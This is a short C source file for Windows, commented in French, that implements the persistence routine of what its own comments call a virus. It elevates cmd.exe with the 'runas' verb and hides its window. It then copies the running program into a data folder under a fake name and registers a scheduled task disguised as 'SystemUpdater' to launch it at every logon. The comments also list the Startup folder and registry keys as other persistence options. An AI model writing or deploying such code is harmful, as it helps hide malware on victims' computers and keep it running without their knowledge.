#include <stdio.h>
#include <shellapi.h>
#include <windows.h>
#include <string.h>

void set_persistance(char *softwareDataDirectory, char *current_executable_path, char *fake_executable_name){

    /*Pour la parsistance du virus il y aa plusieurs manières de faire:
        - copier dans le dossier de démarage:  C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
          le virus.exe

        - creer une clef de registre

        - créer une planification de tache windows (méthode choisi):
          le virus se lance au démarage et il n'apparaît pas au démarage dans le gestionnaire des taches
        
    */

    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";   
    sei.lpFile = "cmd.exe"; 
    char cmd[1024];
    snprintf(cmd, 1024, "/c copy \"%s\" \"%s\\%s\" & schtasks /create /tn SystemUpdater /tr \"%s\\%s\" /sc onlogon", current_executable_path, softwareDataDirectory, fake_executable_name, softwareDataDirectory, fake_executable_name);
    printf("Commande pour la persistance: %s\n", cmd);
    sei.lpParameters = cmd;
    sei.nShow = SW_HIDE; // pour masquer laz fenètre du cmd
    if (ShellExecuteEx(&sei)) {
        WaitForSingleObject(sei.hProcess, INFINITE);
    }
};